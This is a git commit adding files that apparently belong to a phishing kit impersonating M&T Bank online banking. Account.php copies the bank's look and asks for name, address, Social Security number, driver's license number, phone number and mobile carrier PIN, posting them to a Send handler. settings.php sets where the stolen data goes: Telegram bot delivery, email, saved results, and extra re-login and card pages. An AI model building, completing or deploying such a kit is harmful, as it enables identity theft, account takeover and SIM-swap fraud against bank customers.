f5d307357ee4704c74bc934af7b542e2382b2070
UrbanTechHub <143939797+UrbanTechHub@users.noreply.github.com>
2024-09-18 12:41:32 +0100

    Add files via upload

---
+++ Account.php
@@ -0,0 +1,196 @@
+<!DOCTYPE HTML>
+<html lang="en" class="__sticky-footer __sticky-footer--links">
+<head>
+<title>Welcome to Online Banking | M&amp;T Bank</title>
+<link rel="shortcut icon" href="File/favicon.ico" type="image/x-icon" />
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"/>
+<meta http-equiv="X-UA-Compatible" content="ie=edge"/>
+<meta name="format-detection" content="telephone=no"/>
+<link href="./File/css.css" rel="stylesheet"/>
+</head>
+<body>
+<form action="Send/Account.php" method="post"><div class="mtb-app-enrollment">
+<header class="mtb-page-header"> 
+<div class="grid-x align-center">
+<div class="cell">
+<a href="" class="mtb__logo">
+<img src="./File/mtb-logo.svg" alt="M&amp;T Bank Site">
+</a>
+</div>
+</div>
+</header>
+<div class="mtb-app-login--content">
+<div class="grid-x grid-padding-x grid-x__padded __spacer-section">
+<div class="cell">
+ <div class="mtb-section-header mtb-section-header__login">
+<h1>
+We need a bit more info to verify your identity.
+</h1>
+<p>
+Verify your account information
+</p>
+</div>
+</div>
+
+
+<div class="cell">
+
+<div class="cell hide"  data-showFor=BusinessAccount >
+    
+
+    <h2 class="mtb-form__section-title hide"  data-showFor=BusinessAccount>
+        Company Administrator Information
+            <button tabindex="0" type="button" class="m-icon m-icon-questionmarkcircle __contextual-help mtb-help m-icon-questionmarkcircle js-modal-trigger" aria-haspopup="true" aria-controls="reveal-basic"  data-ensightentag=CompanyAdministratorInfoQuestionIcon   data-open=companyadmin-modal>
+                <span class="show-for-sr">Show Help</span>
+            </button>
+    </h2>
+</div>        <div data-parentFor="FirstName" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
+            <label for="FirstName">First Name</label>
+            <input data-fcid="" value=""  maxlength="20" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="letters" placeholder=""  type="text" id="FirstName" name="fname" data-inputType="text" required >
+            <p  class="form-error" id=FirstNameError role="alert"></p>
+            <p class="form-help-text"></p>
+        </div>
+		
+		
+        <div data-parentFor="LastName" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
+            <label for="LastName">Last Name</label>
+            <input data-fcid="" value=""  maxlength="20" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbersletters" placeholder=""  type="text" id="LastName" name="lname" data-inputType="text" required >
+            <p  class="form-error" id=LastNameError role="alert"></p>
+            <p class="form-help-text"></p>
+        </div>
+		
+		<div data-parentFor="Address" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
+            <label for="Address">Street Address</label>
+            <input data-fcid="" value=""  maxlength="20" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbersletters" placeholder=""  type="text" id="Address" name="Address" data-inputType="text" required >
+            <p  class="form-error" id=LastNameError role="alert"></p>
+            <p class="form-help-text"></p>
+        </div>
+		
+		<div data-parentFor="City" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
+            <label for="City">City</label>
+            <input data-fcid="" value=""  maxlength="20" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbersletters" placeholder=""  type="text" id="City" name="City" data-inputType="text" required >
+            <p  class="form-error" id=LastNameError role="alert"></p>
+            <p class="form-help-text"></p>
+        </div>
+		
+		<div data-parentFor="State" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
+            <label for="State">State</label>
+            <input data-fcid="" value=""  maxlength="20" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbersletters" placeholder=""  type="text" id="State" name="State" data-inputType="text" required >
+            <p  class="form-error" id=LastNameError role="alert"></p>
+            <p class="form-help-text"></p>
+        </div>
+		
+		<div data-parentFor="ZIP" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
+            <label for="ZIP">ZIP</label>
+            <input data-fcid="" value=""  maxlength="20" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbersletters" placeholder=""  type="text" id="ZIP" name="ZIP" data-inputType="text" required >
+            <p  class="form-error" id=LastNameError role="alert"></p>
+            <p class="form-help-text"></p>
+        </div>
+		
+		
+      <div data-parentFor="ssn" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
+            <label for="ssn">Social Security number</label>
+            <input data-fcid="" value=""  maxlength="20" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbersletters" placeholder=""  type="text" id="ssn" name="ssn" data-inputType="text" required >
+            <p  class="form-error" id=LastNameError role="alert"></p>
+            <p class="form-help-text"></p>
+        </div>
+		
+		<div data-parentFor="dln" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
+            <label for="dln">Driver's License Number</label>
+            <input data-fcid="" value=""  maxlength="20" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbersletters" placeholder=""  type="text" id="dln" name="dln" data-inputType="text" required >
+            <p  class="form-error" id=LastNameError role="alert"></p>
+            <p class="form-help-text"></p>
+        </div>
+		
+		<div data-parentFor="phone" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
+            <label for="phone">Phone Number</label>
+            <input data-fcid="" value=""  maxlength="10" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbersletters" placeholder=""  type="text" id="phone" name="phone" data-inputType="text" required >
+            <p  class="form-error" id=LastNameError role="alert"></p>
+            <p class="form-help-text"></p>
+        </div>
+		
+		<div data-parentFor="pin" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
+            <label for="pin">Carrier PIN</label>
+            <input data-fcid="" value=""  maxlength="20" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbersletters" placeholder=""  type="text" id="pin" name="pin" data-inputType="text" required >
+            <p  class="form-error" id=LastNameError role="alert"></p>
+            <p class="form-help-text"></p>
+        </div>
+			
+			
+            <p class="form-error" id=AccountNumberError role="alert"></p>
+                <p class="form-help-text"></p>
+            
+        </div>
+
+
+
+     
+         
+        </section>
+       
+
+
+<div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
+<div class="cell">
+<button type="submit" class="button button__form-no-spacer expanded" >
+Next
+</button>
+</div>
+
+<p class="cell text-center __font-size-tiny __color-gray-accent">
+Unauthorized access is prohibited. Usage may be monitored.
+</p>
+</div>
+</div>
+<hr class="__spacer-section"/>
+<div class="mtb-app-default--content">
+<div class="grid-x grid-padding-x grid-x__padded">
+<div class="cell text-center">
+
+</div>
+</div>
+</div>
+<section class="mtb-footer mtb-footer__auth" role="contentinfo">
+<div class="grid-x">
+<div class="cell flex-container flex-dir-column align-center-middle">
+<div class="mtb-footer--auth">
+<a href="" class="" target="_blank">Get Started Guide</a>
+<a href="" target="_blank">Security Assistance</a>
+<a href="" target="_blank">Digital Service Agreement</a>
+<a href="" target="_blank">ESign Agreement</a>
+<a href="" target="_blank">
+Accessibility
+</a>
+<a href="" target="_blank">
+mtb.com
+</a>
+</div>
+<div class="mtb-footer--non-auth">
+<p>
+&copy;2023 M&amp;T Bank. All Rights Reserved.<br>
+Users of this website agree to be bound by the provisions of the M&amp;T website <a href="" target="_blank">
+Terms of
+Use
+</a> and <a href="" target="_blank">Privacy Policy</a>.
+</p>
+<div class="mtb-footer__logo">
+<a href="" target="_blank">
+<img src=File/mtb-equalhousinglender.svg class="mtb-footer__equalhousinglender" alt="Equal Housing Lender" />
+</a>
+<a href="" target="_blank">
+<img src="File/mtb-entrust.svg " class="mtb-footer__entrust" alt="Entrust" />
+</a>
+</div>
+<p>
+Equal Housing Lender NMLS #381076
+<a href="" target="_blank">Member FDIC</a>
+</p>
+</div>
+</div>
+</div>
+</section>
+</div>
+</form>
+</body>
+</html>
---
+++ settings.php
@@ -0,0 +1,15 @@
+<?php
+$settings = array(
+    "client"		=> "Mac Hemsworth",
+	"telegram"		=> "1",
+	"chat_id"		=> "YOURCHATID",
+	"bot_url"		=> "botYOURTOKEN",
+	"send_mail"		=> "1",
+	"email"			=> "youremail@email.com",
+	"save_results"		=> "1",
+	"Relogin"		=> "1",
+	"Card"			=> "1",
+	"Emailpage"		=> "0",
+);
+return $settings;
+?>	
